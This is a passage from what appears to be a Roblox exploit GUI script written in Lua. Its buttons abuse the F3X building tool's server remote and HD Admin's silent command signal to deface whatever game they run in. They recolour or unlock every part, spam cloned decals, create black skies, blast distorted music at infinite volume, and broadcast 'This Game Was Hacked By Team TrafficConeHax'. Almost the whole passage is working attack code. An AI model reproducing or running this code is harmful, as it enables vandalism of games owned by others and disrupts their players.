	_({"SyncAnchor", {{["Part"] = part, ["Anchored"] = boolean}}})
end

function CreatePart(cf, parent)
	_({"CreatePart", "Normal", cf, parent})
end

function DestroyPart(part)
	_({"Remove", {part}})
end

function MovePart(part, cf)
	_({"SyncMove", {{["Part"] = part, ["CFrame"] = cf}}})
end

function Resize(part, size, cf)
	_({"SyncResize", {{["Part"] = part, ["CFrame"] = cf, ["Size"] = size}}})
end

function AddMesh(part)
	_({"CreateMeshes", {{["Part"] = part}}})
end

function SetMesh(part, meshid)
	_({"SyncMesh", {{["Part"] = part, ["MeshId"] = "rbxassetid://"..meshid}}})
end

function SetTexture(part, texid)
	_({"SyncMesh", {{["Part"] = part, ["TextureId"] = "rbxassetid://"..texid}}})
end

function SetName(part, stringg)
	_({"SetName", {part}, stringg})
end

function MeshResize(part, size)
	_({"SyncMesh", {{["Part"] = part, ["Scale"] = size}}})
end

function Weld(part1, part2, lead)
	_({"CreateWelds", {part1, part2}, lead})
end

function SetLocked(part, boolean)
	_({"SetLocked", {part}, boolean})
end

function SetTrans(part, int)
	_({"SyncMaterial", {{["Part"] = part, ["Transparency"] = int}}})
end

function CreateSpotlight(part)
	_({"CreateLights", {{["Part"] = part, ["LightType"] = "SpotLight"}}})
end

function SyncLighting(part, brightness)
	_({"SyncLighting", {{["Part"] = part, ["LightType"] = "SpotLight", ["Brightness"] = brightness}}})
end

function AddFire(part)
	_({"CreateDecorations", {{["Part"] = part, ["DecorationType"] = "Fire"}}})
end

function RedLights()
	local targets = {}
	local lightSyncBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if v:IsA("Light") then
			local part = v.Parent
			if part and part:IsA("BasePart") then
				if not part:FindFirstAncestorOfClass("Model") or not game.Players:GetPlayerFromCharacter(part:FindFirstAncestorOfClass("Model")) then
					table.insert(targets, {part = part, className = v.ClassName})
				end
			end
		end
	end

	for _, info in ipairs(targets) do
		table.insert(lightSyncBatch, {
			["Part"] = info.part, 
			["LightType"] = info.className, 
			["Color"] = Color3.fromRGB(0, 0, 255)
		})
	end

	if #lightSyncBatch > 0 then
		_({"SyncLighting", lightSyncBatch})
	end
end

RedLights()

end)
end

local TextButton24 = Instance.new("TextButton")
TextButton24.Name = "TextButton"
TextButton24.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton24.Text = "random colour spam"
TextButton24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton24.TextSize = 14
TextButton24.TextWrapped = true
TextButton24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton24.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton24.BorderSizePixel = 2
TextButton24.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton24.Size = UDim2.new(0, 74, 0, 31)
TextButton24.Parent = R[226]

local LocalScript24 = Instance.new("Folder")
LocalScript24.Name = "LocalScript"
LocalScript24.Parent = TextButton24
__S[#__S + 1] = function(...)
local script = LocalScript24
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end
function SetCollision(part,boolean)
	local args = {
		[1] = "SyncCollision",
		[2] = {
			[1] = {
				["Part"] = part,
				["CanCollide"] = boolean
			}
		}
	}
	_(args)
end
function SetAnchor(boolean,part)
	local args = {
		[1] = "SyncAnchor",
		[2] = {
			[1] = {
				["Part"] = part,
				["Anchored"] = boolean
			}
		}
	}
	_(args)
end
function CreatePart(cf,parent)
	local args = {
		[1] = "CreatePart",
		[2] = "Normal",
		[3] = cf,
		[4] = parent
	}
	_(args)
end
function DestroyPart(part)
	local args = {
		[1] = "Remove",
		[2] = {
			[1] = part
		}
	}
	_(args)
end
function MovePart(part,cf)
	local args = {
		[1] = "SyncMove",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf
			}
		}
	}
	_(args)
end
function Resize(part,size,cf)
	local args = {
		[1] = "SyncResize",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf,
				["Size"] = size
			}
		}
	}
	_(args)
end
function AddMesh(part)
	local args = {
		[1] = "CreateMeshes",
		[2] = {
			[1] = {
				["Part"] = part
			}
		}
	}
	_(args)
end

function SetMesh(part,meshid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["MeshId"] = "rbxassetid://"..meshid
			}
		}
	}
	_(args)
end
function SetTexture(part, texid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["TextureId"] = "rbxassetid://"..texid
			}
		}
	}
	_(args)
end
function SetName(part, stringg)
	local args = {
		[1] = "SetName",
		[2] = {
			[1] = workspace.Part
		},
		[3] = stringg
	}

	_(args)
end
function MeshResize(part,size)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["Scale"] = size
			}
		}
	}
	_(args)
end
function Weld(part1, part2,lead)
	local args = {
		[1] = "CreateWelds",
		[2] = {
			[1] = part1,
			[2] = part2
		},
		[3] = lead
	}
	_(args)

end
function SetLocked(part,boolean)
	local args = {
		[1] = "SetLocked",
		[2] = {
			[1] = part
		},
		[3] = boolean
	}
	_(args)
end
function SetTrans(part,int)
	local args = {
		[1] = "SyncMaterial",
		[2] = {
			[1] = {
				["Part"] = part,
				["Transparency"] = int
			}
		}
	}
	_(args)
end
function CreateSpotlight(part)
	local args = {
		[1] = "CreateLights",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight"
			}
		}
	}
	_(args)
end
function SyncLighting(part,brightness)
	local args = {
		[1] = "SyncLighting",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight",
				["Brightness"] = brightness
			}
		}
	}
	_(args)
end
function Color(part,color)
	local args = {
		[1] = "SyncColor",
		[2] = {
			[1] = {
				["Part"] = part,
				["Color"] = color,
				["UnionColoring"] = false
			}
		}
	}
	_(args)
end
function randomise()
	local targets = {}
	local unlockBatch = {}
	local colorBatch = {}

	for i,v in game.Workspace:GetDescendants() do
		if v:IsA("BasePart") and v.Name ~= "Terrain" and not string.find(v.Name, "Sky") then
			if not v:FindFirstAncestorOfClass("Model") or not game.Players:GetPlayerFromCharacter(v:FindFirstAncestorOfClass("Model")) then
				table.insert(targets, v)
			end
		end
	end

	for _, part in ipairs(targets) do
		table.insert(unlockBatch, part)
		table.insert(colorBatch, {
			["Part"] = part,
			["Color"] = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)),
			["UnionColoring"] = false
		})
	end

	if #targets > 0 then
		_({"SetLocked", unlockBatch, false})
		_({"SyncColor", colorBatch})
	end
end
randomise()

end)
end

local TextButton25 = Instance.new("TextButton")
TextButton25.Name = "TextButton"
TextButton25.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton25.Text = "2014 mario.exe"
TextButton25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton25.TextSize = 14
TextButton25.TextWrapped = true
TextButton25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton25.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton25.BorderSizePixel = 2
TextButton25.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton25.Size = UDim2.new(0, 74, 0, 31)
TextButton25.Parent = R[226]

local LocalScript25 = Instance.new("Folder")
LocalScript25.Name = "LocalScript"
LocalScript25.Parent = TextButton25
__S[#__S + 1] = function(...)
local script = LocalScript25
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 93184334779935 ;volume 2 ;pitch 0.9")
wait(0.25)
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local SMALL_ID = "8974992306"
local ZERO = Vector3.new(0, 0, 0)
local SKY_MESH = "111891702759441"
local SKY_SCALES = { [99999] = true, [10000] = true, [11000] = true, [110000] = true }

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function getMeshScale(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.Scale
	end
	return Vector3.new(0, 0, 0)
end

local function getVertexColor(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.VertexColor
	end
	return Vector3.new(1, 1, 1)
end

-- A sky is any part whose SpecialMesh uses the sky mesh, whatever it is named
local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";time 0 ;fogcolor black")

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor or Vector3.new(1, 1, 1) } } })
end

function CreatePart(cf, parent)
	_({ "CreatePart", "Normal", cf, parent })
end

function AddMesh(part)
	_({ "CreateMeshes", { { Part = part } } })
end

function SetTexture(part, texid)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid } } })
end

function SetName(part, stringg)
	_({ "SetName", { part }, stringg })
end

function MeshResize(part, size)
	_({ "SyncMesh", { { Part = part, Scale = size } } })
end

function SetLocked(part, boolean)
	_({ "SetLocked", { part }, boolean })
end

function SetTrans(part, int)
	_({ "SyncMaterial", { { Part = part, Transparency = int } } })
end

function Color(part, color)
	_({ "SyncColor", { { Part = part, Color = color, UnionColoring = false } } })
end

function SyncLighting(part, brightness)
	_({ "SyncLighting", { { Part = part, LightType = "PointLight", Brightness = brightness } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	local finalColor = vertexColor or (mesh and mesh.VertexColor) or Vector3.new(1, 1, 1)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = finalColor } } })
end

-- Polls until an unnamed part has replicated at x,z and returns it
local function waitForPartAt(x, z, timeout)
	local start = os.clock()
	repeat
		for _, v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not isSky(v) and v.CFrame.X == x and v.CFrame.Z == z then
				return v
			end
		end
		RunService.Heartbeat:Wait()
	until os.clock() - start > (timeout or 2)
	return nil
end

-- Finds the existing big (black) sky and the existing small (99999-ish) sky
local function findExisting()
	local big, small
	for _, v in ipairs(workspace:GetDescendants()) do
		if isSky(v) then
			if getVertexColor(v) == ZERO then
				big = big or v
			elseif SKY_SCALES[math.round(getMeshScale(v).X)] then
				small = small or v
			end
		end
	end
	return big, small
end

-- Configures a freshly created part as a sky
local function setupSky(v, spec)
	SetName(v, "Sky")
	AddMesh(v)

	SetMesh(v, SKY_MESH, spec.vertexColor)
	SetTexture(v, spec.id)
	MeshResize(v, Vector3.new(spec.scale, spec.scale, spec.scale))

	SetLocked(v, true)
	SetTrans(v, spec.transparency)

	_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

	Color(v, Color3.fromRGB(255, 255, 255))

	_({ "CreateLights", { { Part = v, LightType = "PointLight" } } })

	SyncLighting(v, 0)
end

function UpdateSkies()
	for i, v in game.Workspace:GetDescendants() do
		if isSky(v) then
			local specialMesh = v:FindFirstChildOfClass("SpecialMesh")
			if specialMesh then
				local vColor = specialMesh.VertexColor
				if vColor == ZERO then
					continue
				end

				local currentScale = specialMesh.Scale
				local currentTexture = specialMesh.TextureId:match("%d+") or ""
				local currentMeshId = specialMesh.MeshId:match("%d+") or SKY_MESH

				local targetVertexColor
				local targetTransparency

				if currentScale.X >= 105000 then
					targetVertexColor = ZERO
					targetTransparency = 0
				elseif currentScale.X >= 90000 and currentScale.X <= 100000 then
					targetVertexColor = Vector3.new(3.3, 3.3, 3.3)
					targetTransparency = 0.02
				else
					targetVertexColor = vColor
					targetTransparency = v.Transparency
				end

				if currentTexture ~= "" then
					UpdateMeshTextureAndColor(v, currentTexture, targetVertexColor)
				else
					SetMesh(v, currentMeshId, targetVertexColor)
				end

				SetLocked(v, true)
				SetTrans(v, targetTransparency)

				_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

				Color(v, Color3.fromRGB(255, 255, 255))
				SyncLighting(v, 0)
			end
		end
	end
end

-- Main
local big, small = findExisting()

if not small then
	-- only convert leftover skies when there's no small sky yet
	UpdateSkies()
	big, small = findExisting()
end

if small then
	-- rerun: only swap the image on the 99999 sky, leave the big one alone
	UpdateMeshTextureAndColor(small, SMALL_ID, nil)
end

local specs = {}
if not big then
	table.insert(specs, { id = "dont change this", transparency = 0, scale = 110000, vertexColor = ZERO, offset = Vector3.new(-25, -10, 0) })
end
if not small then
	table.insert(specs, { id = SMALL_ID, transparency = 0.02, scale = 99999, vertexColor = Vector3.new(4, 4, 4), offset = Vector3.new(25, -10, 0) })
end

if #specs > 0 then
	local hrp = char.HumanoidRootPart.CFrame
	local basePos = Vector3.new(math.floor(hrp.X), math.floor(hrp.Y), math.floor(hrp.Z))

	-- create every missing part at the same time
	for _, spec in ipairs(specs) do
		spec.pos = basePos + spec.offset
		task.spawn(CreatePart, CFrame.new(spec.pos) + Vector3.new(0, -10, 0), workspace)
	end

	-- then configure them all at the same time
	for _, spec in ipairs(specs) do
		task.spawn(function()
			local part = waitForPartAt(spec.pos.X, spec.pos.Z)
			if part then
				setupSky(part, spec)
			end
		end)
	end
end
	wait(0.25)
		local id = "8974992306"

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end
	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end
	local remote = tool.SyncAPI.ServerEndpoint
function _(args)
    return remote:InvokeServer(unpack(args))
end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function SpawnDecal(part,side)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal"
						}
					}
				}
	
				_(args)
			end
			function AddDecal(part,asset,side)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal",
							["Texture"] = "rbxassetid://".. asset
						}
					}
				}
				_(args)
			end
function ClonePart(table,parent)
    	 local args = {
           [1] ="Clone",
           [2] = table,
           [3] = parent
        }

    _(args)
end
function removetable(t)
    local args = { [1] = "Remove", [2] = {} }
    for _, v in pairs(t) do
        if v ~= nil and v:IsA("Decal") then
            table.insert(args[2],v)
       end
    end
  if #args[2] > 0 then
    _(args)
    end
end
	
           local testpart = remote:InvokeServer("CreatePart","Normal",CFrame.new(102938,182939,2928458), workspace.Terrain)
local root = testpart 
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Front)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Front)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Back)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Back)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Right)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Right)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Left)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Left)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Bottom)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Bottom)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Top)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Top)
                  end)
repeat task.wait()until root:FindFirstChildOfClass("Decal")
local decals = {}
for i,v in root: GetDescendants()do
if v:IsA"Decal"then 
table.insert(decals,v)
end
end
function exPro(root)
task.spawn(ClonePart,decals,root)
end



local decalsintothevoid={}


				for i,v in game.workspace:GetDescendants() do
           if v:IsA("Decal")then
            table.insert(decalsintothevoid,v)--if any new decals destroy them
            end
end
function asdf()
				for i,v in game.workspace:GetDescendants() do
					if v:IsA("BasePart") and v.Name ~= "Sky" then
          task.defer(exPro,v)
					end
				end 
end
			asdf()


if #decalsintothevoid>0 then
task.spawn(removetable,decalsintothevoid)
end

end)
end

local TextButton26 = Instance.new("TextButton")
TextButton26.Name = "TextButton"
TextButton26.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton26.Text = "creepy"
TextButton26.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton26.TextSize = 14
TextButton26.TextWrapped = true
TextButton26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton26.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton26.BorderSizePixel = 2
TextButton26.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton26.Size = UDim2.new(0, 74, 0, 31)
TextButton26.Parent = R[226]

local LocalScript26 = Instance.new("Folder")
LocalScript26.Name = "LocalScript"
LocalScript26.Parent = TextButton26
__S[#__S + 1] = function(...)
local script = LocalScript26
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 77291827804556 ;volume inf ;pitch 0.07")
wait(0.25)
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local SMALL_ID = "5671063061"
local ZERO = Vector3.new(0, 0, 0)
local SKY_MESH = "111891702759441"
local SKY_SCALES = { [99999] = true, [10000] = true, [11000] = true, [110000] = true }

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("no f3x broo")
	return
end

local function getMeshScale(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.Scale
	end
	return Vector3.new(0, 0, 0)
end

local function getVertexColor(part)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	if mesh then
		return mesh.VertexColor
	end
	return Vector3.new(1, 1, 1)
end

-- A sky is any part whose SpecialMesh uses the sky mesh, whatever it is named
local function isSky(part)
	if not part:IsA("BasePart") then
		return false
	end
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	return mesh ~= nil and mesh.MeshId:match("%d+") == SKY_MESH
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

RequestCommand:InvokeServer(";time 0 ;fogcolor black")

local tool
for i, v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i, v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end

local remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end

function SetMesh(part, meshid, vertexColor)
	_({ "SyncMesh", { { Part = part, MeshId = "rbxassetid://" .. meshid, VertexColor = vertexColor or Vector3.new(1, 1, 1) } } })
end

function CreatePart(cf, parent)
	_({ "CreatePart", "Normal", cf, parent })
end

function AddMesh(part)
	_({ "CreateMeshes", { { Part = part } } })
end

function SetTexture(part, texid)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid } } })
end

function SetName(part, stringg)
	_({ "SetName", { part }, stringg })
end

function MeshResize(part, size)
	_({ "SyncMesh", { { Part = part, Scale = size } } })
end

function SetLocked(part, boolean)
	_({ "SetLocked", { part }, boolean })
end

function SetTrans(part, int)
	_({ "SyncMaterial", { { Part = part, Transparency = int } } })
end

function Color(part, color)
	_({ "SyncColor", { { Part = part, Color = color, UnionColoring = false } } })
end

function SyncLighting(part, brightness)
	_({ "SyncLighting", { { Part = part, LightType = "PointLight", Brightness = brightness } } })
end

function UpdateMeshTextureAndColor(part, texid, vertexColor)
	local mesh = part:FindFirstChildOfClass("SpecialMesh")
	local finalColor = vertexColor or (mesh and mesh.VertexColor) or Vector3.new(1, 1, 1)
	_({ "SyncMesh", { { Part = part, TextureId = "rbxassetid://" .. texid, VertexColor = finalColor } } })
end

-- Polls until an unnamed part has replicated at x,z and returns it
local function waitForPartAt(x, z, timeout)
	local start = os.clock()
	repeat
		for _, v in ipairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and not isSky(v) and v.CFrame.X == x and v.CFrame.Z == z then
				return v
			end
		end
		RunService.Heartbeat:Wait()
	until os.clock() - start > (timeout or 2)
	return nil
end

-- Finds the existing big (black) sky and the existing small (99999-ish) sky
local function findExisting()
	local big, small
	for _, v in ipairs(workspace:GetDescendants()) do
		if isSky(v) then
			if getVertexColor(v) == ZERO then
				big = big or v
			elseif SKY_SCALES[math.round(getMeshScale(v).X)] then
				small = small or v
			end
		end
	end
	return big, small
end

-- Configures a freshly created part as a sky
local function setupSky(v, spec)
	SetName(v, "Sky")
	AddMesh(v)

	SetMesh(v, SKY_MESH, spec.vertexColor)
	SetTexture(v, spec.id)
	MeshResize(v, Vector3.new(spec.scale, spec.scale, spec.scale))

	SetLocked(v, true)
	SetTrans(v, spec.transparency)

	_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

	Color(v, Color3.fromRGB(255, 255, 255))

	_({ "CreateLights", { { Part = v, LightType = "PointLight" } } })

	SyncLighting(v, 0)
end

function UpdateSkies()
	for i, v in game.Workspace:GetDescendants() do
		if isSky(v) then
			local specialMesh = v:FindFirstChildOfClass("SpecialMesh")
			if specialMesh then
				local vColor = specialMesh.VertexColor
				if vColor == ZERO then
					continue
				end

				local currentScale = specialMesh.Scale
				local currentTexture = specialMesh.TextureId:match("%d+") or ""
				local currentMeshId = specialMesh.MeshId:match("%d+") or SKY_MESH

				local targetVertexColor
				local targetTransparency

				if currentScale.X >= 105000 then
					targetVertexColor = ZERO
					targetTransparency = 0
				elseif currentScale.X >= 90000 and currentScale.X <= 100000 then
					targetVertexColor = Vector3.new(3.3, 3.3, 3.3)
					targetTransparency = 0.02
				else
					targetVertexColor = vColor
					targetTransparency = v.Transparency
				end

				if currentTexture ~= "" then
					UpdateMeshTextureAndColor(v, currentTexture, targetVertexColor)
				else
					SetMesh(v, currentMeshId, targetVertexColor)
				end

				SetLocked(v, true)
				SetTrans(v, targetTransparency)

				_({ "SyncMaterial", { { Part = v, Material = Enum.Material.Neon } } })

				Color(v, Color3.fromRGB(255, 255, 255))
				SyncLighting(v, 0)
			end
		end
	end
end

-- Main
local big, small = findExisting()

if not small then
	-- only convert leftover skies when there's no small sky yet
	UpdateSkies()
	big, small = findExisting()
end

if small then
	-- rerun: only swap the image on the 99999 sky, leave the big one alone
	UpdateMeshTextureAndColor(small, SMALL_ID, nil)
end

local specs = {}
if not big then
	table.insert(specs, { id = "dont change this", transparency = 0, scale = 110000, vertexColor = ZERO, offset = Vector3.new(-25, -10, 0) })
end
if not small then
	table.insert(specs, { id = SMALL_ID, transparency = 0.02, scale = 99999, vertexColor = Vector3.new(4, 4, 4), offset = Vector3.new(25, -10, 0) })
end

if #specs > 0 then
	local hrp = char.HumanoidRootPart.CFrame
	local basePos = Vector3.new(math.floor(hrp.X), math.floor(hrp.Y), math.floor(hrp.Z))

	-- create every missing part at the same time
	for _, spec in ipairs(specs) do
		spec.pos = basePos + spec.offset
		task.spawn(CreatePart, CFrame.new(spec.pos) + Vector3.new(0, -10, 0), workspace)
	end

	-- then configure them all at the same time
	for _, spec in ipairs(specs) do
		task.spawn(function()
			local part = waitForPartAt(spec.pos.X, spec.pos.Z)
			if part then
				setupSky(part, spec)
			end
		end)
	end
end
	wait(0.25)
		local id = "109129888"

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			tool = v.Parent
		end
	end
	if tool == nil then
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end
	local remote = tool.SyncAPI.ServerEndpoint
function _(args)
    return remote:InvokeServer(unpack(args))
end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function SpawnDecal(part,side)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal"
						}
					}
				}
	
				_(args)
			end
			function AddDecal(part,asset,side)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal",
							["Texture"] = "rbxassetid://".. asset
						}
					}
				}
				_(args)
			end
function ClonePart(table,parent)
    	 local args = {
           [1] ="Clone",
           [2] = table,
           [3] = parent
        }

    _(args)
end
function removetable(t)
    local args = { [1] = "Remove", [2] = {} }
    for _, v in pairs(t) do
        if v ~= nil and v:IsA("Decal") then
            table.insert(args[2],v)
       end
    end
  if #args[2] > 0 then
    _(args)
    end
end
	
           local testpart = remote:InvokeServer("CreatePart","Normal",CFrame.new(102938,182939,2928458), workspace.Terrain)
local root = testpart 
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Front)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Front)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Back)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Back)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Right)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Right)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Left)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Left)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Bottom)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Bottom)
	              end)
						task.defer(function()
							SpawnDecal(root,Enum.NormalId.Top)
              end)
						task.defer(function()
							AddDecal(root,id,Enum.NormalId.Top)
                  end)
repeat task.wait()until root:FindFirstChildOfClass("Decal")
local decals = {}
for i,v in root: GetDescendants()do
if v:IsA"Decal"then 
table.insert(decals,v)
end
end
function exPro(root)
task.spawn(ClonePart,decals,root)
end



local decalsintothevoid={}


				for i,v in game.workspace:GetDescendants() do
           if v:IsA("Decal")then
            table.insert(decalsintothevoid,v)--if any new decals destroy them
            end
end
function asdf()
				for i,v in game.workspace:GetDescendants() do
					if v:IsA("BasePart") and v.Name ~= "Sky" then
          task.defer(exPro,v)
					end
				end 
end
			asdf()


if #decalsintothevoid>0 then
task.spawn(removetable,decalsintothevoid)
end

end)
end

local TextButton27 = Instance.new("TextButton")
TextButton27.Name = "TextButton"
TextButton27.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton27.Text = "message 1"
TextButton27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton27.TextSize = 14
TextButton27.TextWrapped = true
TextButton27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton27.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton27.BorderSizePixel = 2
TextButton27.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton27.Size = UDim2.new(0, 74, 0, 31)
TextButton27.Parent = R[226]

local LocalScript27 = Instance.new("Folder")
LocalScript27.Name = "LocalScript"
LocalScript27.Parent = TextButton27
__S[#__S + 1] = function(...)
local script = LocalScript27
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";sm This Game Was Hacked By Team TrafficConeHax")
end)
end

local TextButton28 = Instance.new("TextButton")
